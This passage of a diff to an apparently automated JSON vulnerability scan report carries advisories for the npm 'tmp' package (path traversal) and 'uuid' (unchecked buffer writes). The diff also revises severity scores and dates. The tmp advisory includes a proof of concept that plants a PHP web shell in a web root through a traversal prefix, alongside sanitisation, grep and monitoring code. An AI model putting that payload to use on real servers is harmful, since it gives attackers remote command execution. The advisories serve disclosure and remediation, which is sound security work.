/tmp/sensitive-area/malicious.config\n  console.log('Final malicious path:', filepath);\n  cleanup();\n});\n```\n\n**Real-World Attack Simulation:**\n```javascript\n// Simulate web API that accepts user file prefix\nfunction createUserTempFile(userPrefix, content) {\n  return new Promise((resolve, reject) =\u003e {\n    tmp.file({ prefix: userPrefix }, (err, path, fd, cleanup) =\u003e {\n      if (err) return reject(err);\n      \n      fs.writeSync(fd, content);\n      console.log('User file created at:', path);\n      resolve({ path, cleanup });\n    });\n  });\n}\n\n// Attacker input\nconst attackerPrefix = '../../../var/www/html/backdoor';\ncreateUserTempFile(attackerPrefix, '\u003c?php system($_GET[\"cmd\"]); ?\u003e');\n// Creates PHP backdoor in web root instead of temp directory\n```\n\n### Impact\n\n**Arbitrary File Creation:**\n- Files created outside intended temporary directories\n- Attacker control over file placement location\n- Potential to overwrite existing files (depending on creation flags)\n- Cross-platform exploitation capability\n\n**Attack Scenarios:**\n\n**1. Web Application Configuration Poisoning:**\n- User uploads file with malicious prefix/postfix\n- tmp creates \"temporary\" file in application configuration directory\n- Malicious configuration loaded on next application restart\n\n**2. Cache Poisoning:**\n- Application caches user content using tmp\n- Attacker escapes to cache directory of different user/tenant\n- Poisoned cache serves malicious content to other users\n\n**3. Build Pipeline Compromise:**\n- CI/CD system processes user PRs with tmp usage\n- Malicious prefix escapes to build output directories\n- Compromised build artifacts deployed to production\n\n**4. Container Escape Attempt:**\n- Containerized application uses tmp with user input\n- Attacker attempts to escape container temp restrictions\n- Files created in host-mapped volumes or sensitive container areas\n\n**5. Multi-Tenant Service Bypass:**\n- SaaS platform isolates tenants using separate tmp directories\n- Tenant A escapes their tmp space to tenant B's area\n- Cross-tenant data access and potential privilege escalation\n\n**Business Impact:**\n- **Data Integrity:** Unauthorized file placement can corrupt application state\n- **Service Disruption:** Files in wrong locations may break application functionality  \n- **Security Bypass:** Escape temporary isolation boundaries\n- **Compliance Violations:** Files containing sensitive data placed in uncontrolled locations\n\n### Affected Products\n\n- **Ecosystem:** npm\n- **Package name:** tmp\n- **Repository:** github.com/raszi/node-tmp\n- **Affected versions:** All versions with vulnerable path construction logic\n- **Patched versions:** None currently available\n\n**Component Impact:**\n- `tmp.file()` function - vulnerable to prefix/postfix/dir traversal\n- `tmp.dir()` function - vulnerable to same parameter manipulation  \n- `tmp.tmpName()` function - if using affected path construction\n\n**Severity:** High  \n**CVSS v3.1:** 8.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:L)\n\n**CWE Classification:**\n- CWE-22: Improper Limitation of a Pathname to a Restricted Directory (Path Traversal)\n\n### Remediation\n\n**Input Validation and Sanitization:**\n\n1. **Sanitize prefix/postfix:**\n```javascript\nfunction sanitizePrefix(prefix) {\n  if (!prefix) return '';\n  // Remove path separators and traversal sequences\n  return path.basename(String(prefix)).replace(/[\\.\\/\\\\]/g, '-');\n}\n\nfunction sanitizePostfix(postfix) {\n  if (!postfix) return '';\n  // Allow only safe characters\n  return String(postfix).replace(/[^A-Za-z0-9._-]/g, '');\n}\n```\n\n2. **Validate dir parameter:**\n```javascript\nfunction validateDir(dir, baseDir) {\n  if (!dir) return '';\n  \n  // Reject absolute paths\n  if (path.isAbsolute(dir)) {\n    throw new Error('Absolute paths not allowed for dir option');\n  }\n  \n  // Resolve and check containment\n  const resolved = path.resolve(baseDir, dir);\n  const relative = path.relative(baseDir, resolved);\n  \n  if (relative.startsWith('..') || path.isAbsolute(relative)) {\n    throw new Error('Dir option escapes base directory');\n  }\n  \n  return dir;\n}\n```\n\n3. **Post-construction path validation:**\n```javascript\nfunction validateFinalPath(finalPath, baseDir) {\n  const resolved = path.resolve(finalPath);\n  const relative = path.relative(path.resolve(baseDir), resolved);\n  \n  if (relative.startsWith('..') || path.isAbsolute(relative)) {\n    throw new Error('Generated path escapes temporary directory');\n  }\n  \n  return resolved;\n}\n```\n\n**Secure Implementation Pattern:**\n```javascript\nfunction createTempFile(options) {\n  const opts = { ...options };\n  \n  // Sanitize inputs\n  opts.prefix = sanitizePrefix(opts.prefix);\n  opts.postfix = sanitizePostfix(opts.postfix);\n  opts.dir = validateDir(opts.dir, opts.tmpdir);\n  \n  // Create with sanitized options\n  return tmp.file(opts, (err, path, fd, cleanup) =\u003e {\n    if (err) return callback(err);\n    \n    // Validate final path\n    try {\n      validateFinalPath(path, opts.tmpdir);\n    } catch (validationErr) {\n      cleanup();\n      return callback(validationErr);\n    }\n    \n    callback(null, path, fd, cleanup);\n  });\n}\n```\n\n### Workarounds\n\n**For Application Developers:**\n\n1. **Input Sanitization:**\n```javascript\n// Sanitize before passing to tmp\nfunction safeTmpFile(userOptions) {\n  const safeOpts = {\n    ...userOptions,\n    prefix: userOptions.prefix ? path.basename(userOptions.prefix) : undefined,\n    postfix: userOptions.postfix ? userOptions.postfix.replace(/[^A-Za-z0-9._-]/g, '') : undefined,\n    dir: undefined // Don't allow user-controlled dir\n  };\n  \n  return tmp.file(safeOpts);\n}\n```\n\n2. **Path Validation:**\n```javascript\nfunction validateTmpPath(tmpPath, expectedBase) {\n  const relativePath = path.relative(expectedBase, tmpPath);\n  if (relativePath.startsWith('..') || path.isAbsolute(relativePath)) {\n    throw new Error('Temporary file path escaped base directory');\n  }\n  return tmpPath;\n}\n```\n\n3. **Restricted Usage:**\n```javascript\n// Only use tmp with known-safe, literal values\ntmp.file({ prefix: 'app-temp-', postfix: '.tmp' }, callback);\n// Never: tmp.file({ prefix: userInput }, callback);\n```\n\n**For Security Teams:**\n\n1. **Code Review Patterns:**\n```bash\n# Search for dangerous tmp usage\ngrep -r \"tmp\\.file.*prefix.*req\\|tmp\\.file.*postfix.*req\" .\ngrep -r \"tmp\\.dir.*opts\\|tmp\\.file.*opts\" .\n```\n\n2. **Runtime Monitoring:**\n```javascript\n// Monitor for files created outside expected temp areas\nconst originalFile = tmp.file;\ntmp.file = function(options, callback) {\n  return originalFile(options, (err, path, fd, cleanup) =\u003e {\n    if (!err \u0026\u0026 options.tmpdir) {\n      const relative = require('path').relative(options.tmpdir, path);\n      if (relative.startsWith('..')) {\n        console.warn('Path traversal detected:', path);\n      }\n    }\n    return callback(err, path, fd, cleanup);\n  });\n};\n```\n\n### Detection and Monitoring\n\n**Static Analysis:**\n- Scan for tmp usage with user-controlled input\n- Identify unsanitized parameter passing to tmp functions\n- Review file creation patterns in temporary directories\n\n**Runtime Detection:**\n```javascript\n// Log suspicious tmp operations\nfunction monitorTmpUsage() {\n  const originalTmpFile = require('tmp').file;\n  \n  require('tmp').file = function(options = {}, callback) {\n    // Check for suspicious patterns\n    const suspicious = [\n      options.prefix \u0026\u0026 options.prefix.includes('..'),\n      options.postfix \u0026\u0026 options.postfix.includes('..'),  \n      options.dir \u0026\u0026 path.isAbsolute(options.dir)\n    ].some(Boolean);\n    \n    if (suspicious) {\n      console.warn('Suspicious tmp usage detected:', options);\n    }\n    \n    return originalTmpFile.call(this, options, callback);\n  };\n}\n```\n\n**File System Monitoring:**\n```bash\n# Monitor file creation outside expected temp directories\ninotifywait -m -r --format '%w%f %e' /tmp /var/tmp | while read file event; do\n  if [[ \"$event\" == *\"CREATE\"* \u0026\u0026 \"$file\" != /tmp/tmp-* ]]; then\n    echo \"Unexpected file creation: $file\"\n  fi\ndone\n```\n### Acknowledgements\n\n**Reported by**: Mapta / BugBunny_ai",
+          "Severity": "HIGH",
+          "VendorSeverity": {
+            "ghsa": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N/E:P",
+              "V40Score": 7.7
+            }
+          },
+          "References": [
+            "https://github.com/raszi/node-tmp",
+            "https://github.com/raszi/node-tmp/commit/efa4a06f24374797ae32ab2b6ae39b7a611ae429",
+            "https://github.com/raszi/node-tmp/security/advisories/GHSA-ph9p-34f9-6g65"
+          ]
         },
         {
           "VulnerabilityID": "CVE-2016-1000232",
@@ -40803,7 +41168,7 @@
             "https://www.npmjs.com/advisories/525"
           ],
           "PublishedDate": "2017-10-04T01:29:03.403Z",
-          "LastModifiedDate": "2025-04-20T01:37:25.86Z"
+          "LastModifiedDate": "2026-05-13T00:24:29.033Z"
         },
         {
           "VulnerabilityID": "CVE-2023-26136",
@@ -40942,7 +41307,7 @@
             "https://www.npmjs.com/advisories/525"
           ],
           "PublishedDate": "2017-10-04T01:29:03.403Z",
-          "LastModifiedDate": "2025-04-20T01:37:25.86Z"
+          "LastModifiedDate": "2026-05-13T00:24:29.033Z"
         },
         {
           "VulnerabilityID": "CVE-2023-26136",
@@ -41302,8 +41667,7 @@
           "VendorSeverity": {
             "ghsa": 3,
             "nodejs-security-wg": 2,
-            "nvd": 3,
-            "ubuntu": 2
+            "nvd": 3
           },
           "CVSS": {
             "ghsa": {
@@ -41323,12 +41687,11 @@
             "https://github.com/advisories/GHSA-c9f4-xj24-8jqx",
             "https://nodesecurity.io/advisories/48",
             "https://nvd.nist.gov/vuln/detail/CVE-2015-8858",
-            "https://www.cve.org/CVERecord?id=CVE-2015-8858",
             "https://www.npmjs.com/advisories/48",
             "https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS"
           ],
           "PublishedDate": "2017-01-23T21:59:00.61Z",
-          "LastModifiedDate": "2025-04-20T01:37:25.86Z"
+          "LastModifiedDate": "2026-05-13T00:24:29.033Z"
         },
         {
           "VulnerabilityID": "CVE-2019-10795",
@@ -41507,17 +41870,19 @@
           ],
           "VendorSeverity": {
             "ghsa": 3,
-            "nvd": 3,
+            "nvd": 2,
             "redhat": 2
           },
           "CVSS": {
             "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H",
               "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+              "V3Score": 5.9,
               "V40Score": 8.2
             },
             "nvd": {
-              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
-              "V3Score": 7.5
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 5.9
             },
             "redhat": {
               "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H",
@@ -41538,7 +41903,7 @@
             "https://www.cve.org/CVERecord?id=CVE-2026-27601"
           ],
           "PublishedDate": "2026-03-03T23:15:55.56Z",
-          "LastModifiedDate": "2026-03-05T21:08:35.32Z"
+          "LastModifiedDate": "2026-04-28T15:06:03.603Z"
         },
         {
           "VulnerabilityID": "CVE-2021-23358",
@@ -41664,17 +42029,19 @@
           ],
           "VendorSeverity": {
             "ghsa": 3,
-            "nvd": 3,
+            "nvd": 2,
             "redhat": 2
           },
           "CVSS": {
             "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H",
               "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+              "V3Score": 5.9,
               "V40Score": 8.2
             },
             "nvd": {
-              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
-              "V3Score": 7.5
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 5.9
             },
             "redhat": {
               "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H",
@@ -41695,10 +42062,13 @@
             "https://www.cve.org/CVERecord?id=CVE-2026-27601"
           ],
           "PublishedDate": "2026-03-03T23:15:55.56Z",
-          "LastModifiedDate": "2026-03-05T21:08:35.32Z"
+          "LastModifiedDate": "2026-04-28T15:06:03.603Z"
         },
         {
-          "VulnerabilityID": "GHSA-w5hq-g745-h8pq",
+          "VulnerabilityID": "CVE-2026-41907",
+          "VendorIDs": [
+            "GHSA-w5hq-g745-h8pq"
+          ],
           "PkgID": "uuid@3.3.2",
           "PkgName": "uuid",
           "PkgIdentifier": {
@@ -41706,36 +42076,61 @@
             "UID": "87de5c8829064839"
           },
           "InstalledVersion": "3.3.2",
-          "FixedVersion": "14.0.0",
+          "FixedVersion": "11.1.1, 12.0.1, 13.0.1",
           "Status": "fixed",
           "SeveritySource": "ghsa",
-          "PrimaryURL": "https://github.com/advisories/GHSA-w5hq-g745-h8pq",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-41907",
           "DataSource": {
             "ID": "ghsa",
             "Name": "GitHub Security Advisory npm",
             "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
           },
-          "Fingerprint": "sha256:477cbb300e8b8bc761869d355a13b950e5030888b7cf4358ad1b1a46a44be3bb",
-          "Title": "uuid: Missing buffer bounds check in v3/v5/v6 when buf is provided",
-          "Description": "### Summary\n\n`v3`, `v5`, and `v6` accept external output buffers but do not reject out-of-range writes (small `buf` or large `offset`).  \nBy contrast, `v4`, `v1`, and `v7` explicitly throw `RangeError` on invalid bounds.\n\nThis inconsistency allows **silent partial writes** into caller-provided buffers.\n\n\n### Affected code\n\n- `src/v35.ts` (`v3`/`v5` path) writes `buf[offset + i]` without bounds validation.\n- `src/v6.ts` writes `buf[offset + i]` without bounds validation.\n\n### Reproducible PoC\n\n```bash\ncd /home/StrawHat/uuid\nnpm ci\nnpm run build\n\nnode --input-type=module -e \"\nimport {v4,v5,v6} from './dist-node/index.js';\nconst ns='6ba7b810-9dad-11d1-80b4-00c04fd430c8';\nfor (const [name,fn] of [\n  ['v4',()=\u003ev4({},new Uint8Array(8),4)],\n  ['v5',()=\u003ev5('x',ns,new Uint8Array(8),4)],\n  ['v6',()=\u003ev6({},new Uint8Array(8),4)],\n]) {\n  try { fn(); console.log(name,'NO_THROW'); }\n  catch(e){ console.log(name,'THREW',e.name); }\n}\"\n```\n\nObserved:\n\n- `v4 THREW RangeError`\n- `v5 NO_THROW`\n- `v6 NO_THROW`\n\nExample partial overwrite evidence captured during audit:\n\n```text\nsame true buf [\n  170, 170, 170, 170,\n   75, 224, 100,  63\n]\nv6 [\n  187, 187, 187, 187,\n   31,  19, 185,  64\n]\n```\n\n### Security impact\n\n- **Primary**: integrity/robustness issue (silent partial output).\n- If an application assumes full UUID writes into preallocated buffers, this can produce malformed/truncated/partially stale identifiers without error.\n- In systems where caller-controlled offsets/buffer sizes are exposed indirectly, this may become a security-relevant logic flaw.\n\n### Suggested fix\n\nAdd the same guard used by `v4`/`v1`/`v7`:\n\n```ts\nif (offset \u003c 0 || offset + 16 \u003e buf.length) {\n  throw new RangeError(`UUID byte range ${offset}:${offset + 15} is out of buffer bounds`);\n}\n```\n\nApply to:\n\n- `src/v35.ts` (covers `v3` and `v5`)\n- `src/v6.ts`",
+          "Fingerprint": "sha256:0e2634faf3456c4b3c5006dc25c24b1a7cf170c05ddc37ec91336a470868dc65",
+          "Title": "uuid: uuid: Out-of-bounds write vulnerability impacts data integrity and confidentiality",
+          "Description": "uuid is for the creation of RFC9562 (formerly RFC4122) UUIDs. Prior to 14.0.0, v3, v5, and v6 accept external output buffers but do not reject out-of-range writes (small buf or large offset). This allows silent partial writes into caller-provided buffers. This vulnerability is fixed in 14.0.0.",
           "Severity": "MEDIUM",
+          "CweIDs": [
+            "CWE-787",
+            "CWE-823"
+          ],
           "VendorSeverity": {
-            "ghsa": 2
+            "ghsa": 2,
+            "nvd": 3,
+            "redhat": 2
           },
           "CVSS": {
             "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
               "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N",
+              "V3Score": 7.5,
               "V40Score": 6.3
+            },
+            "nvd": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
+              "V3Score": 4.8
             }
           },
           "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-41907",
             "https://github.com/uuidjs/uuid",
+            "https://github.com/uuidjs/uuid/commit/32389c887c9e75f90442ee4cc95bbab0c4e8346e",
             "https://github.com/uuidjs/uuid/commit/3d2c5b0342f0fcb52a5ac681c3d47c13e7444b34",
+            "https://github.com/uuidjs/uuid/commit/3d61d6ac1f782cf6b1dd8661c60f11722cd49a0d",
+            "https://github.com/uuidjs/uuid/commit/9d27ddf7046ce496ef39569ff84d948eeff9cb2a",
+            "https://github.com/uuidjs/uuid/releases/tag/v11.1.1",
+            "https://github.com/uuidjs/uuid/releases/tag/v12.0.1",
+            "https://github.com/uuidjs/uuid/releases/tag/v13.0.1",
             "https://github.com/uuidjs/uuid/releases/tag/v14.0.0",
-            "https://github.com/uuidjs/uuid/security/advisories/GHSA-w5hq-g745-h8pq"
+            "https://github.com/uuidjs/uuid/security/advisories/GHSA-w5hq-g745-h8pq",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-41907",
+            "https://www.cve.org/CVERecord?id=CVE-2026-41907"
           ],
-          "PublishedDate": "2026-04-22T20:53:24Z",
-          "LastModifiedDate": "2026-04-22T20:53:24Z"
+          "PublishedDate": "2026-04-24T19:17:14.49Z",
+          "LastModifiedDate": "2026-05-11T13:53:19.343Z"
         },
         {
           "VulnerabilityID": "CVE-2020-7662",
